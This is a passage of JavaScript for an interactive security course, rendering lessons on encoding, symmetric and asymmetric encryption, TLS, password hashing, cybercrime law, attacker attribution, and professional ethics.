            diff: 'ENCRYPTION vs ENCODING vs HASHING:\n\n┌──────────────┬─────────────────────────────┐\n│ ENCRYPTION   │ Uses KEY to protect data    │\n│              │ Reversible WITH key         │\n│              │ Goal: Confidentiality       │\n│              │ Ex: AES, RSA                │\n├──────────────┼─────────────────────────────┤\n│ ENCODING     │ NO KEY - data transformation│\n│              │ Fully reversible by anyone  │\n│              │ Goal: Data format change    │\n│              │ Ex: Base64, URL encoding    │\n├──────────────┼─────────────────────────────┤\n│ HASHING      │ One-way function            │\n│              │ NOT reversible              │\n│              │ Goal: Integrity verification│\n│              │ Ex: SHA-256, bcrypt         │\n└──────────────┴─────────────────────────────┘\n\n⚠️ ENCODING IS NOT SECURITY!',
            encoding: 'COMMON ENCODING SCHEMES:\n\nBASE64 ENCODING:\n  Input:  "Hello"\n  Base64: "SGVsbG8="\n\n  $ echo "Hello" | base64\n  SGVsbG8=\n  $ echo "SGVsbG8=" | base64 -d\n  Hello\n\n  ⚠️ Anyone can decode - NO security!\n\nURL ENCODING:\n  Input:  "Hello World!"\n  URL:    "Hello%20World%21"\n  (Spaces → %20, Special chars → %XX)\n\nHEX ENCODING:\n  Input:  "Hi"\n  Hex:    "4869"\n  (Each byte as 2 hex digits)\n\nUNICODE/UTF-8:\n  Data representation, not security',
            mistakes: 'COMMON SECURITY MISTAKES:\n\n❌ MISTAKE 1: Base64 = Encryption\n   "We encode passwords in Base64"\n   → WRONG! Anyone can decode Base64\n\n❌ MISTAKE 2: Obfuscation = Security\n   ROT13, character substitution\n   → NOT encryption, easily reversed\n\n❌ MISTAKE 3: Proprietary encoding\n   "Our custom encoding is secure"\n   → Security through obscurity fails\n\n✅ CORRECT APPROACH:\n\n  Passwords: Hash with bcrypt/Argon2\n             + salt + pepper\n\n  Sensitive data: Encrypt with AES-256\n                  + proper key management\n\n  Data transmission: TLS/HTTPS\n\n  API tokens: Cryptographically random\n              + secure storage'
        };
        $('#encVsEncOut').textContent = data.diff;
        $$('#encVsEncTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#encVsEncTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#encVsEncOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 4: symmetric-encryption - Symmetric Encryption
    function demoSymmetricEncryption(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Symmetric Encryption</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="symTabs">
                <button class="demo-btn demo-btn-sm active" data-t="how">How It Works</button>
                <button class="demo-btn demo-btn-sm" data-t="aes">AES Algorithm</button>
                <button class="demo-btn demo-btn-sm" data-t="modes">Block Cipher Modes</button>
            </div>
            <div id="symOut" style="background:#1a1a2e;color:#81c784;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            how: 'SYMMETRIC ENCRYPTION:\n\nSame key for encryption AND decryption\n\n  Alice                          Bob\n    │                              │\n    │  "secret message"            │\n    │       ↓                      │\n    │  [ENCRYPT with Key K]        │\n    │       ↓                      │\n    │  "Xk#9p2mL..."              │\n    │  ─────────────────────────▶  │\n    │       (ciphertext)           │\n    │                        [DECRYPT with Key K]\n    │                              ↓\n    │                   "secret message"\n\n✅ ADVANTAGES:\n   • Very fast (hardware acceleration)\n   • Efficient for large data\n\n⚠️ CHALLENGE:\n   How do Alice & Bob share Key K securely?\n   → Key exchange problem (solved by asymmetric)',
            aes: 'AES (Advanced Encryption Standard):\n\n  Selected by NIST in 2001 (Rijndael algorithm)\n  Replaced DES (56-bit, now broken)\n\nKEY SIZES:\n  ┌────────────┬──────────┬──────────────┐\n  │ AES-128    │ 128 bits │ Very secure  │\n  │ AES-192    │ 192 bits │ Extra secure │\n  │ AES-256    │ 256 bits │ Maximum      │\n  └────────────┴──────────┴──────────────┘\n\nBLOCK SIZE: 128 bits (16 bytes)\n\nAES ROUNDS:\n  AES-128: 10 rounds\n  AES-192: 12 rounds\n  AES-256: 14 rounds\n\nEach round: SubBytes → ShiftRows →\n            MixColumns → AddRoundKey\n\n✅ No known practical attacks on AES\n✅ Hardware acceleration (AES-NI in CPUs)',
            modes: 'BLOCK CIPHER MODES:\n\n⚠️ ECB (Electronic Codebook) - NEVER USE!\n   Same plaintext → Same ciphertext\n   Patterns visible in encrypted data\n\n✅ CBC (Cipher Block Chaining):\n   Each block XOR\'d with previous ciphertext\n   Requires IV (Initialization Vector)\n   Sequential processing only\n\n✅ CTR (Counter Mode):\n   Counter encrypted, XOR with plaintext\n   Parallelizable, random access\n   Same key+counter = BROKEN!\n\n✅ GCM (Galois/Counter Mode):\n   CTR mode + Authentication tag\n   Provides confidentiality + integrity\n   RECOMMENDED for most uses\n\n┌─────────────────────────────────────┐\n│ RECOMMENDATION: AES-256-GCM        │\n│ • Authenticated encryption          │\n│ • Detects tampering                 │\n│ • Industry standard                 │\n└─────────────────────────────────────┘'
        };
        $('#symOut').textContent = data.how;
        $$('#symTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#symTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#symOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 5: asymmetric-encryption - Asymmetric Encryption
    function demoAsymmetricEncryption(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Asymmetric Encryption</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="asymTabs">
                <button class="demo-btn demo-btn-sm active" data-t="how">How It Works</button>
                <button class="demo-btn demo-btn-sm" data-t="rsa">RSA</button>
                <button class="demo-btn demo-btn-sm" data-t="ecc">ECC</button>
            </div>
            <div id="asymOut" style="background:#1a1a2e;color:#ba68c8;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            how: 'ASYMMETRIC (PUBLIC KEY) ENCRYPTION:\n\nTwo mathematically related keys:\n\n┌─────────────────────────────────────┐\n│  PUBLIC KEY      PRIVATE KEY        │\n│  (share freely)  (keep secret)      │\n├─────────────────────────────────────┤\n│  Encrypt data    Decrypt data       │\n│  Verify signature Sign data         │\n└─────────────────────────────────────┘\n\n  Alice                          Bob\n    │    ← Bob\'s PUBLIC key ←      │\n    │                              │\n    │  [ENCRYPT with Bob\'s PUBLIC] │\n    │  ─────────────────────────▶  │\n    │       (ciphertext)           │\n    │                  [DECRYPT with Bob\'s PRIVATE]\n\n✅ Solves key distribution problem!\n✅ Digital signatures possible\n\n⚠️ SLOWER than symmetric encryption\n   Use hybrid: Asymmetric for key exchange,\n              Symmetric for data',
            rsa: 'RSA ALGORITHM:\n\nBased on factoring large prime numbers\n\nKEY GENERATION:\n  1. Choose large primes p, q (2048+ bits each)\n  2. n = p × q (modulus)\n  3. φ(n) = (p-1)(q-1)\n  4. Choose e (public exponent, often 65537)\n  5. d = e⁻¹ mod φ(n) (private exponent)\n\n  Public Key: (n, e)\n  Private Key: (n, d)\n\nENCRYPTION: c = m^e mod n\nDECRYPTION: m = c^d mod n\n\nKEY SIZES:\n  RSA-2048: Minimum recommended\n  RSA-3072: Better for long-term security\n  RSA-4096: High security applications\n\n⚠️ Quantum computers could break RSA\n   (Shor\'s algorithm for factoring)',
            ecc: 'ELLIPTIC CURVE CRYPTOGRAPHY (ECC):\n\nBased on elliptic curve discrete log problem\n\nCURVE: y² = x³ + ax + b (over finite field)\n\n┌─────────────────────────────────────┐\n│ ECC KEY SIZE EQUIVALENCE            │\n├─────────────────────────────────────┤\n│ ECC 256-bit ≈ RSA 3072-bit          │\n│ ECC 384-bit ≈ RSA 7680-bit          │\n│ ECC 521-bit ≈ RSA 15360-bit         │\n└─────────────────────────────────────┘\n\n✅ ADVANTAGES:\n   • Much smaller keys than RSA\n   • Faster operations\n   • Less bandwidth/storage\n\nCOMMON CURVES:\n  P-256 (secp256r1): NIST standard\n  Curve25519: Modern, fast (Bernstein)\n  secp256k1: Bitcoin\n\n⚠️ Also vulnerable to quantum computers\n   (Post-quantum crypto being developed)'
        };
        $('#asymOut').textContent = data.how;
        $$('#asymTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#asymTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#asymOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 6: https-tls - HTTPS and TLS
    function demoHTTPSTLS(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">INTERACTIVE</span><span class="demo-title">HTTPS and TLS</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="tlsTabs">
                <button class="demo-btn demo-btn-sm active" data-t="handshake">TLS Handshake</button>
                <button class="demo-btn demo-btn-sm" data-t="certs">Certificates</button>
                <button class="demo-btn demo-btn-sm" data-t="attacks">Attacks</button>
            </div>
            <div id="tlsOut" style="background:#1a1a2e;color:#4db6ac;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            handshake: 'TLS 1.3 HANDSHAKE:\n\n  Client                         Server\n    │                              │\n  1.│── ClientHello ──────────────▶│\n    │   • TLS version              │\n    │   • Cipher suites            │\n    │   • Key share                │\n    │                              │\n  2.│◀───── ServerHello ───────────│\n    │◀───── Certificate ───────────│\n    │◀───── CertVerify ────────────│\n    │◀───── Finished ──────────────│\n    │   • Chosen cipher            │\n    │   • Server key share         │\n    │   • Server cert              │\n    │                              │\n  3.│── Finished ─────────────────▶│\n    │                              │\n  4.│◀════ Application Data ══════▶│\n         (encrypted with session key)\n\nTLS 1.3: 1-RTT (faster than TLS 1.2\'s 2-RTT)',
            certs: 'TLS CERTIFICATES (X.509):\n\n┌─────────────────────────────────────┐\n│         X.509 CERTIFICATE           │\n├─────────────────────────────────────┤\n│ Subject: CN=www.example.com         │\n│ Issuer: CN=DigiCert Inc             │\n│ Valid: 2024-01-01 to 2025-01-01     │\n│ Public Key: RSA 2048-bit            │\n│ Signature: SHA256withRSA            │\n└─────────────────────────────────────┘\n\nCERTIFICATE CHAIN:\n  ┌─────────────┐\n  │ Root CA     │ ← Built into browsers/OS\n  │ (trusted)   │\n  └──────┬──────┘\n         │ signs\n  ┌──────▼──────┐\n  │Intermediate │\n  │     CA      │\n  └──────┬──────┘\n         │ signs\n  ┌──────▼──────┐\n  │ Server Cert │ ← www.example.com\n  └─────────────┘',
            attacks: 'TLS ATTACKS & MITIGATIONS:\n\n⚠️ DOWNGRADE ATTACKS:\n   Force use of weaker cipher/version\n   ✅ Mitigation: Disable old versions\n      (TLS 1.0, 1.1 deprecated)\n\n⚠️ CERTIFICATE ATTACKS:\n   Rogue CA, expired certs, wrong domain\n   ✅ Mitigation: Certificate Transparency,\n      HSTS, CAA records\n\n⚠️ BEAST, POODLE, CRIME:\n   Attacks on older TLS versions/ciphers\n   ✅ Mitigation: Use TLS 1.3, modern ciphers\n\n⚠️ MITM (Man-in-the-Middle):\n   Intercept and modify traffic\n   ✅ Mitigation: Certificate pinning,\n      verify certificate chain\n\nBEST PRACTICES:\n  • TLS 1.3 only (or 1.2 minimum)\n  • Strong cipher suites (AEAD)\n  • HSTS header enabled\n  • Valid certificate from trusted CA'
        };
        $('#tlsOut').textContent = data.handshake;
        $$('#tlsTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#tlsTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#tlsOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 7: hashing-security - Hashing for Security
    function demoHashingSecurity(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Hashing for Security</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="hashTabs">
                <button class="demo-btn demo-btn-sm active" data-t="props">Properties</button>
                <button class="demo-btn demo-btn-sm" data-t="algos">Algorithms</button>
                <button class="demo-btn demo-btn-sm" data-t="passwords">Password Hashing</button>
            </div>
            <div id="hashOut" style="background:#1a1a2e;color:#ff8a65;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            props: 'CRYPTOGRAPHIC HASH PROPERTIES:\n\n1. DETERMINISTIC:\n   Same input → Always same output\n   SHA256("Hello") = 185f8db3... (always)\n\n2. ONE-WAY (Pre-image Resistance):\n   Cannot reverse hash to find input\n   185f8db3... → ??? (impossible)\n\n3. COLLISION RESISTANT:\n   Infeasible to find two inputs with same hash\n   H(x) = H(y) where x ≠ y (very hard)\n\n4. AVALANCHE EFFECT:\n   Small input change → Completely different hash\n\n   "Hello"  → 185f8db32271fe...\n   "hello"  → 2cf24dba5fb0a3...\n         ↑ Just one character different!\n\n5. FIXED OUTPUT SIZE:\n   SHA-256: Always 256 bits (32 bytes)\n   Regardless of input size',
            algos: 'HASH ALGORITHMS:\n\n┌──────────────┬────────┬───────────────┐\n│ Algorithm    │ Output │ Status        │\n├──────────────┼────────┼───────────────┤\n│ MD5          │ 128bit │ ❌ BROKEN     │\n│ SHA-1        │ 160bit │ ❌ DEPRECATED │\n│ SHA-256      │ 256bit │ ✅ SECURE     │\n│ SHA-384      │ 384bit │ ✅ SECURE     │\n│ SHA-512      │ 512bit │ ✅ SECURE     │\n│ SHA-3        │ varies │ ✅ SECURE     │\n│ BLAKE2       │ varies │ ✅ SECURE     │\n│ BLAKE3       │ varies │ ✅ FAST       │\n└──────────────┴────────┴───────────────┘\n\n$ echo -n "Hello" | sha256sum\n185f8db32271fe25f561a6fc938b2e26...\n\n$ echo -n "Hello" | sha512sum\n3615f80c9d293ed7402687f94b22d58e...\n\n⚠️ For passwords: Use bcrypt, Argon2, NOT SHA!',
            passwords: 'PASSWORD HASHING (SPECIAL REQUIREMENTS):\n\n⚠️ Why NOT regular hashes (SHA-256)?\n   • Too fast! GPUs can try billions/sec\n   • Rainbow tables: Precomputed hashes\n\n✅ PASSWORD HASHING FUNCTIONS:\n   Designed to be SLOW (computationally expensive)\n\n┌─────────────────────────────────────┐\n│ bcrypt (1999)                       │\n│ • Adjustable work factor            │\n│ • Built-in salt                     │\n│ • $2b$12$salt...hash                │\n├─────────────────────────────────────┤\n│ Argon2 (2015) - RECOMMENDED         │\n│ • Memory-hard (resists GPU attacks) │\n│ • Winner of Password Hashing Comp   │\n│ • Argon2id variant recommended      │\n├─────────────────────────────────────┤\n│ scrypt                              │\n│ • Memory-hard                       │\n│ • Used by some cryptocurrencies     │\n└─────────────────────────────────────┘\n\nALWAYS: Hash + Salt (unique per user)'
        };
        $('#hashOut').textContent = data.props;
        $$('#hashTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#hashTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#hashOut').textContent = data[b.dataset.t];
            };
        });
    }

    // Backward compatibility for demoEncryption
    function demoEncryption(pane) { demoEncryptionIntro(pane); }

    // C9 Lesson 8: security-law-intro - Introduction to Security Law
    function demoSecurityLawIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">LAW</span><span class="demo-title">Introduction to Security Law</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="lawIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="why">Why Law Matters</button>
                <button class="demo-btn demo-btn-sm" data-t="types">Law Types</button>
                <button class="demo-btn demo-btn-sm" data-t="global">Global Overview</button>
            </div>
            <div id="lawIntroOut" style="background:#2d2d30;color:#ffd54f;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            why: 'WHY SECURITY PROFESSIONALS NEED LAW KNOWLEDGE:\n\n⚖️ STAY OUT OF JAIL:\n   Unauthorized access = Criminal offense\n   Even "ethical" hacking needs authorization\n   Ignorance is NOT a defense\n\n📋 PROFESSIONAL REQUIREMENTS:\n   Penetration testers: Need written permission\n   Incident responders: Evidence handling rules\n   Security researchers: Responsible disclosure\n\n🔒 PROTECT YOUR ORGANIZATION:\n   Compliance requirements (GDPR, HIPAA, PCI)\n   Liability considerations\n   Contracts and NDAs\n\n⚠️ KEY PRINCIPLE:\n┌─────────────────────────────────────┐\n│ "Just because you CAN doesn\'t mean │\n│  you\'re LEGALLY ALLOWED to."       │\n└─────────────────────────────────────┘\n\nAlways get written authorization!',
            types: 'TYPES OF CYBER LAW:\n\n┌─────────────────────────────────────┐\n│ CRIMINAL LAW                        │\n│ • Computer Fraud and Abuse Act (US) │\n│ • Unauthorized access               │\n│ • Data theft, ransomware            │\n│ Punishment: Fines, imprisonment     │\n├─────────────────────────────────────┤\n│ CIVIL LAW                           │\n│ • Breach of contract                │\n│ • Negligence, liability             │\n│ • Privacy violations                │\n│ Punishment: Monetary damages        │\n├─────────────────────────────────────┤\n│ REGULATORY/COMPLIANCE               │\n│ • GDPR (EU data protection)         │\n│ • HIPAA (US healthcare)             │\n│ • PCI-DSS (payment cards)           │\n│ Punishment: Fines, sanctions        │\n└─────────────────────────────────────┘',
            global: 'GLOBAL CYBERSECURITY LAWS:\n\n🇺🇸 UNITED STATES:\n   • CFAA (Computer Fraud and Abuse Act)\n   • DMCA (Digital Millennium Copyright)\n   • ECPA (Electronic Communications Privacy)\n\n🇪🇺 EUROPEAN UNION:\n   • GDPR (General Data Protection)\n   • NIS Directive (Network/Info Security)\n   • Cybercrime Convention (Budapest)\n\n🇬🇧 UNITED KINGDOM:\n   • Computer Misuse Act 1990\n   • Data Protection Act 2018\n\n🇦🇺 AUSTRALIA:\n   • Cybercrime Act 2001\n   • Privacy Act 1988\n\n⚠️ JURISDICTION MATTERS:\n   Attacks can cross borders\n   Which country\'s law applies?\n   International cooperation needed'
        };
        $('#lawIntroOut').textContent = data.why;
        $$('#lawIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#lawIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#lawIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 9: law-cybersecurity - Cybersecurity Law Details
    function demoLawCybersecurity(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">LAW</span><span class="demo-title">Cybersecurity Law Details</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="lawCyberTabs">
                <button class="demo-btn demo-btn-sm active" data-t="cfaa">CFAA</button>
                <button class="demo-btn demo-btn-sm" data-t="gdpr">GDPR</button>
                <button class="demo-btn demo-btn-sm" data-t="penalties">Penalties</button>
            </div>
            <div id="lawCyberOut" style="background:#2d2d30;color:#ffca28;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            cfaa: 'COMPUTER FRAUD AND ABUSE ACT (CFAA):\n\n18 U.S.C. § 1030 - Key Provisions:\n\n❌ PROHIBITED ACTIVITIES:\n\n  (a)(2) Accessing without authorization to\n         obtain information\n\n  (a)(4) Knowingly accessing to defraud\n\n  (a)(5) Causing damage to a computer\n         (viruses, DoS attacks)\n\n  (a)(6) Trafficking in passwords\n\n  (a)(7) Extortion (ransomware)\n\nCRITICAL TERMS:\n  "Authorization" - Permission from owner\n  "Exceeds authorized access" - Going beyond\n                               permitted scope\n\n⚠️ Even port scanning could be violation\n   if done without authorization!',
            gdpr: 'GDPR (General Data Protection Regulation):\n\nEU Regulation - Effective May 2018\n\nKEY PRINCIPLES:\n  1. Lawfulness, fairness, transparency\n  2. Purpose limitation\n  3. Data minimization\n  4. Accuracy\n  5. Storage limitation\n  6. Integrity and confidentiality\n  7. Accountability\n\nDATA SUBJECT RIGHTS:\n  ✓ Right to access\n  ✓ Right to rectification\n  ✓ Right to erasure ("right to be forgotten")\n  ✓ Right to data portability\n  ✓ Right to object\n\nBREACH NOTIFICATION:\n  • 72 hours to notify authority\n  • Notify affected individuals if high risk\n\nPENALTIES:\n  Up to €20 million or 4% global revenue\n  (whichever is higher)',
            penalties: 'CYBERCRIME PENALTIES:\n\n┌─────────────────────────────────────┐\n│ CFAA PENALTIES (US)                 │\n├─────────────────────────────────────┤\n│ First offense (misdemeanor):        │\n│   Up to 1 year + fines              │\n│                                     │\n│ Felony offenses:                    │\n│   5-20 years + significant fines    │\n│                                     │\n│ Aggravated (national security):     │\n│   Up to life imprisonment           │\n└─────────────────────────────────────┘\n\nREAL CASES:\n  • Kevin Mitnick: 5 years + supervised release\n  • Aaron Swartz: Faced 35 years (JSTOR)\n  • Marcus Hutchins: 1 year (malware)\n\n⚠️ REMEMBER:\n   "I was just testing" is NOT a defense\n   "I didn\'t steal anything" is NOT a defense\n   Unauthorized access alone is a crime'
        };
        $('#lawCyberOut').textContent = data.cfaa;
        $$('#lawCyberTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#lawCyberTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#lawCyberOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 10: getting-caught - Getting Caught
    function demoGettingCaught(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">WARNING</span><span class="demo-title">Getting Caught</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="caughtTabs">
                <button class="demo-btn demo-btn-sm active" data-t="how">How People Get Caught</button>
                <button class="demo-btn demo-btn-sm" data-t="traces">Digital Traces</button>
                <button class="demo-btn demo-btn-sm" data-t="cases">Case Studies</button>
            </div>
            <div id="caughtOut" style="background:#2d2d30;color:#ef5350;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            how: 'HOW HACKERS GET CAUGHT:\n\n🔍 TECHNICAL ATTRIBUTION:\n   • IP address logging\n   • Server access logs\n   • Malware signatures\n   • Coding style analysis\n   • Time zone analysis\n\n👤 HUMAN FACTORS:\n   • Bragging online\n   • Reusing usernames\n   • Social media posts\n   • Informants/snitches\n   • Operational mistakes\n\n🏛️ LAW ENFORCEMENT:\n   • International cooperation\n   • Undercover operations\n   • Honeypots and sting ops\n   • ISP data requests\n   • Cryptocurrency tracing\n\n⚠️ MYTH BUSTED:\n   "VPN/Tor makes you anonymous"\n   → Many hackers caught despite using them\n   → OPSEC failures are common',
            traces: 'DIGITAL TRACES LEFT BEHIND:\n\n┌─────────────────────────────────────┐\n│ NETWORK TRACES                      │\n├─────────────────────────────────────┤\n│ • ISP logs (source IP)              │\n│ • Firewall logs                     │\n│ • IDS/IPS alerts                    │\n│ • DNS query logs                    │\n│ • NetFlow data                      │\n├─────────────────────────────────────┤\n│ SYSTEM TRACES                       │\n├─────────────────────────────────────┤\n│ • Authentication logs               │\n│ • File access timestamps            │\n│ • Registry changes (Windows)        │\n│ • Process execution history         │\n│ • Memory artifacts                  │\n├─────────────────────────────────────┤\n│ APPLICATION TRACES                  │\n├─────────────────────────────────────┤\n│ • Web server access logs            │\n│ • Database query logs               │\n│ • Email headers                     │\n│ • Cloud audit trails                │\n└─────────────────────────────────────┘',
            cases: 'FAMOUS ARRESTS:\n\n📌 ROSS ULBRICHT (Silk Road):\n   Caught: Library IP, forum username linked\n   to real identity, laptop seized unlocked\n   Sentence: 2 x life + 40 years\n\n📌 HECTOR MONSEGUR (Sabu, LulzSec):\n   Caught: Connected to IRC without Tor\n   Became FBI informant, helped catch others\n   Sentence: Time served (cooperation)\n\n📌 ALBERT GONZALEZ (TJX Breach):\n   Caught: Already an informant, got greedy\n   Stole 170 million credit cards\n   Sentence: 20 years\n\n📌 GARY MCKINNON (NASA/Pentagon):\n   Caught: Dial-up account traced\n   Fought extradition for 10 years\n   Result: Extradition blocked (mental health)\n\n⚠️ LESSON: No one is truly anonymous'
        };
        $('#caughtOut').textContent = data.how;
        $$('#caughtTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#caughtTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#caughtOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 11: ethics-security - Ethics in Security
    function demoEthicsSecurity(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">ETHICS</span><span class="demo-title">Ethics in Security</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="ethicsTabs">
                <button class="demo-btn demo-btn-sm active" data-t="principles">Principles</button>
                <button class="demo-btn demo-btn-sm" data-t="dilemmas">Ethical Dilemmas</button>
                <button class="demo-btn demo-btn-sm" data-t="codes">Professional Codes</button>
            </div>
            <div id="ethicsOut" style="background:#2d2d30;color:#81d4fa;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            principles: 'ETHICAL PRINCIPLES IN SECURITY:\n\n┌─────────────────────────────────────┐\n│ 1. DO NO HARM                       │\n│    Never cause damage beyond scope  │\n│    Minimize impact of testing       │\n├─────────────────────────────────────┤\n│ 2. RESPECT PRIVACY                  │\n│    Only access what\'s necessary     │\n│    Protect discovered data          │\n├─────────────────────────────────────┤\n│ 3. ACT WITH INTEGRITY               │\n│    Be honest about findings         │\n│    Don\'t exaggerate vulnerabilities │\n├─────────────────────────────────────┤\n│ 4. STAY WITHIN SCOPE                │\n│    Written authorization required   │\n│    Don\'t exceed agreed boundaries   │\n├─────────────────────────────────────┤\n│ 5. REPORT RESPONSIBLY               │\n│    Disclose to affected parties     │\n│    Give time to fix before public   │\n└─────────────────────────────────────┘',
            dilemmas: 'ETHICAL DILEMMAS IN SECURITY:\n\n❓ DILEMMA 1: Zero-Day Discovery\n   Found critical vuln in popular software\n   → Tell vendor? (they might ignore)\n   → Tell public? (attackers will exploit)\n   → Sell to governments? (legal gray area)\n\n❓ DILEMMA 2: Scope Creep\n   During pen test, found evidence of crime\n   → Report to law enforcement?\n   → Stay within scope and ignore?\n   → Inform client only?\n\n❓ DILEMMA 3: Researcher vs Criminal\n   Downloaded leaked database to analyze\n   → Legal? (probably not)\n   → Ethical to study? (debatable)\n   → Should you report what you found?\n\n❓ DILEMMA 4: Dual-Use Research\n   Creating tools that could help defenders\n   BUT could also be used by attackers\n   → Publish? → Restrict access?',
            codes: 'PROFESSIONAL CODES OF ETHICS:\n\n📜 (ISC)² CODE OF ETHICS:\n  I. Protect society and infrastructure\n  II. Act honorably and legally\n  III. Provide competent service\n  IV. Advance the profession\n\n📜 EC-COUNCIL CODE OF ETHICS:\n  • Maintain confidentiality\n  • Do not engage in illegal activities\n  • Report security holes to affected parties\n  • Do not use knowledge for personal gain\n\n📜 SANS ETHICS PRINCIPLES:\n  • Know the law and act within it\n  • Be honest about capabilities\n  • Respect privacy of others\n  • Avoid harm to systems/data\n\n⚖️ CERTIFICATION CONSEQUENCES:\n   Ethics violations can result in:\n   • Certification revocation\n   • Industry blacklisting\n   • Legal prosecution'
        };
        $('#ethicsOut').textContent = data.principles;
        $$('#ethicsTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#ethicsTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#ethicsOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 12: responsible-disclosure - Responsible Disclosure
    function demoResponsibleDisclosure(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">BEST PRACTICE</span><span class="demo-title">Responsible Disclosure</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="discloseTabs">
                <button class="demo-btn demo-btn-sm active" data-t="process">The Process</button>
                <button class="demo-btn demo-btn-sm" data-t="timeline">Timeline</button>
                <button class="demo-btn demo-btn-sm" data-t="bugbounty">Bug Bounties</button>
            </div>
            <div id="discloseOut" style="background:#2d2d30;color:#a5d6a7;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
